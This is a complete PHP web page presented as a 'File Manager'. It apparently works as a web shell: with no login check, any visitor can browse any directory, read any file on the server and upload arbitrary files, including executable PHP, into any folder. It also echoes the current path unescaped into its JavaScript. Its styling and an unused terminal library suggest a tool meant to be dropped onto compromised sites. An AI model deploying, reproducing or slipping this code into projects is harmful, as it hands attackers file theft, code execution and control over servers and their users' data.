<?php
ini_set('log_errors', 1);
ini_set('display_errors', 0);

function setCookieDir($dir) {
    setcookie('current_dir', $dir, time() + 7200, '/'); // Set cookie for 2 hours
}

function getCookieDir() {
    return isset($_COOKIE['current_dir']) ? $_COOKIE['current_dir'] : getcwd();
}

function sanitizePath($path) {
    return str_replace("\\", "/", htmlspecialchars($path, ENT_QUOTES, 'UTF-8'));
}

function getPath() {
    $dir = isset($_GET['dir']) ? sanitizePath($_GET['dir']) : getCookieDir();
    $dir = realpath($dir);

    if ($dir && is_dir($dir)) {
        chdir($dir);
        setCookieDir($dir);
    } else {
        $dir = getcwd();
    }

    return $dir;
}

function renderFileList($dir) {
    if (!is_dir($dir)) {
        return "<p>Directory not found: " . htmlspecialchars($dir, ENT_QUOTES, 'UTF-8') . "</p>";
    }

    function parentDir($dir) {
        return realpath(dirname($dir)) ?: $dir;
    }

    function getFileInfo($path) {
        return [
            'name' => basename($path),
            'path' => $path,
            'owner' => fileowner($path),
            'group' => filegroup($path),
            'perms' => substr(decoct(fileperms($path) & 0777), -3),
            'modification_date' => date("Y-m-d H:i:s", filemtime($path))
        ];
    }

    $items = array_diff(scandir($dir), ['.', '..']);
    $parentPath = ($dir !== '/') ? parentDir($dir) : null;

    $directories = [];
    $files = [];

    if ($parentPath) {
        $directories[] = array_merge(getFileInfo($parentPath), [
            'type' => 'dir',
            'link' => "<a href='#' class='dir-link' data-dir='" . sanitizePath($parentPath) . "'>..</a>"
        ]);
    }

    foreach ($items as $item) {
        $itemPath = $dir . DIRECTORY_SEPARATOR . $item;
        $info = array_merge(getFileInfo($itemPath), [
            'link' => is_dir($itemPath) ? "<a href='#' class='dir-link' data-dir='" . sanitizePath($itemPath) . "'>$item</a>" : "<a href='#' class='file-link' data-file='" . sanitizePath($itemPath) . "'>$item</a>"
        ]);

        if (is_dir($itemPath)) {
            $info['type'] = 'dir';
            $directories[] = $info;
        } elseif (is_file($itemPath)) {
            $info['type'] = 'file';
            $files[] = $info;
        }
    }

    $html = "<table class='table'><thead><tr><th>Name</th><th>Type</th><th>Owner</th><th>Group</th><th>Permissions</th><th>Modification Date</th></tr></thead><tbody>";

    foreach ($directories as $dir) {
        $html .= "<tr><td>{$dir['link']}</td><td>Directory</td><td>{$dir['owner']}</td><td>{$dir['group']}</td><td>{$dir['perms']}</td><td>{$dir['modification_date']}</td></tr>";
    }

    foreach ($files as $file) {
        $html .= "<tr><td>{$file['link']}</td><td>File</td><td>{$file['owner']}</td><td>{$file['group']}</td><td>{$file['perms']}</td><td>{$file['modification_date']}</td></tr>";
    }

    $html .= "</tbody></table>";

    return $html;
}

$dir = getPath();

if (isset($_GET['action'])) {
    switch ($_GET['action']) {
        case 'create_folder':
            if (isset($_POST['folder_name'])) {
                $folderName = sanitizePath($_POST['folder_name']);
                $newFolderPath = $dir . DIRECTORY_SEPARATOR . $folderName;
                if (!file_exists($newFolderPath)) {
                    mkdir($newFolderPath);
                } else {
                    echo "Folder already exists.";
                }
            }
            break;

        case 'create_file':
            if (isset($_POST['file_name'])) {
                $fileName = sanitizePath($_POST['file_name']);
                $newFilePath = $dir . DIRECTORY_SEPARATOR . $fileName;
                if (!file_exists($newFilePath)) {
                    touch($newFilePath);
                } else {
                    echo "File already exists.";
                }
            }
            break;

        case 'upload':
            if (isset($_FILES['upload_file'])) {
                $file = $_FILES['upload_file'];
                $targetFile = $dir . DIRECTORY_SEPARATOR . basename($file['name']);
                move_uploaded_file($file['tmp_name'], $targetFile);
            }
            break;

        case 'view':
            if (isset($_GET['file'])) {
                $file = sanitizePath($_GET['file']);
                if (file_exists($file)) {
                    $content = file_get_contents($file);
                    echo "<p>File Contents: " . htmlspecialchars($file, ENT_QUOTES, 'UTF-8') . "</p>";
                    echo '<pre>' . htmlspecialchars($content, ENT_QUOTES, 'UTF-8') . '</pre>';
                } else {
                    echo "<p>Unable to read file.</p>";
                }
            }
            break;
    }
    exit();
}

if (isset($_GET['dir'])) {
    echo renderFileList($dir);
    exit();
}

$fileListHtml = renderFileList($dir);
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>File Manager</title>
<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/jquery.terminal/js/jquery.terminal.min.js"></script>
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/jquery.terminal/css/jquery.terminal.min.css"/>
<style>
    @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&display=swap');
    body {
        background: linear-gradient(135deg, #0d0d0d, #1a1a1a);
        color: #fff;
        font-family: 'Orbitron', sans-serif;
        display: flex;
        justify-content: center;
        align-items: center;
        height: 100vh;
        padding: 15px;
    }
    .container {
        max-width: 90%;
        background: rgba(20, 20, 20, 0.9);
        border-radius: 15px;
        box-shadow: 0 4px 15px rgba(0, 255, 255, 0.5);
        padding: 20px;
        border: 1px solid #0ff;
    }
    a {
        color: #0ff;
        text-decoration: none !important;
    }
    a:hover {
        color: #00e5e5; 
        text-decoration: none !important;
        cursor:pointer;  
    }
    .btn {
        color: #fff;
        font-size: 12px;
        background-color: transparent;
        border: 1px dashed #0ff;
    }
    .btn:hover {
        color: #0ff;
    }
    .header {
        text-align: center;
        margin-bottom: 10px;
    }
    .nav-pills .nav-link {
        border-radius: 10px;
        margin: 0 5px;
        color: #0ff;
        background: rgba(255, 255, 255, 0.1);
        border: 1px solid transparent;
        transition: background 0.3s, color 0.3s, border 0.3s;
        font-size: 12px;
    }
    .nav-pills .nav-link.active {
        color: #0d0d0d;
        background: #0ff;
        border-color: #0ff;
    }
    .nav-pills .nav-link:hover {
        color: #0d0d0d;
        background: rgba(0, 255, 255, 0.2);
        border-color: #0ff;
    }
    .tab-content {
        background: rgba(20, 20, 20, 0.9);
        border-radius: 10px;
        box-shadow: 0 4px 15px rgba(0, 255, 255, 0.5);
        padding: 20px;
        border: 1px dashed #0ff;
    }
    .tab-pane {
        min-height: 250px;
    }
</style>
</head>
<body>
<div class="container">
    <div class="header">
        <h1>File Manager</h1>
    </div>

    <nav>
        <ul class="nav nav-pills justify-content-center">
            <li class="nav-item">
                <a class="nav-link active" href="#files" id="fileTab">Files</a>
            </li>
            <li class="nav-item">
                <a class="nav-link" href="#create_folder" id="createFolderTab">Create Folder</a>
            </li>
            <li class="nav-item">
                <a class="nav-link" href="#create_file" id="createFileTab">Create File</a>
            </li>
            <li class="nav-item">
                <a class="nav-link" href="#upload" id="uploadTab">Upload</a>
            </li>
        </ul>
    </nav>
    <div class="tab-content">
        <div class="tab-pane fade show active" id="files">
            <div id="fileTable"><?= $fileListHtml ?></div>
        </div>
        <div class="tab-pane fade" id="create_folder">
            <form id="createFolderForm">
                <div class="form-group">
                    <label for="folderName">Folder Name:</label>
                    <input type="text" class="form-control" id="folderName" name="folder_name" required>
                </div>
                <button type="submit" class="btn">Create Folder</button>
            </form>
        </div>
        <div class="tab-pane fade" id="create_file">
            <form id="createFileForm">
                <div class="form-group">
                    <label for="fileName">File Name:</label>
                    <input type="text" class="form-control" id="fileName" name="file_name" required>
                </div>
                <button type="submit" class="btn">Create File</button>
            </form>
        </div>
        <div class="tab-pane fade" id="upload">
            <form id="uploadForm" enctype="multipart/form-data">
                <div class="form-group">
                    <label for="uploadFile">Choose File:</label>
                    <input type="file" class="form-control" id="uploadFile" name="upload_file" required>
                </div>
                <button type="submit" class="btn">Upload File</button>
            </form>
        </div>
    </div>
</div>

<script>
$(document).ready(function() {
    $('.nav-link').on('click', function() {
        $('.nav-link').removeClass('active');
        $(this).addClass('active');
        var target = $(this).attr('href');
        $('.tab-pane').removeClass('show active');
        $(target).addClass('show active');
    });

    function loadFiles(dir) {
        $.get("?dir=" + encodeURIComponent(dir), function(data) {
            $("#fileTable").html(data);
        });
    }

    $(document).on("click", ".dir-link", function() {
        var dir = $(this).data("dir");
        loadFiles(dir);
    });

    $("#createFolderForm").on("submit", function(e) {
        e.preventDefault();
        $.post("?action=create_folder", $(this).serialize(), function() {
            loadFiles('<?= $dir ?>');
        });
    });

    $("#createFileForm").on("submit", function(e) {
        e.preventDefault();
        $.post("?action=create_file", $(this).serialize(), function() {
            loadFiles('<?= $dir ?>');
        });
    });

    $("#uploadForm").on("submit", function(e) {
        e.preventDefault();
        var formData = new FormData(this);
        $.ajax({
            url: "?action=upload",
            type: "POST",
            data: formData,
            processData: false,
            contentType: false,
            success: function() {
                loadFiles('<?= $dir ?>');
            }
        });
    });
});
</script>
</body>
</html>
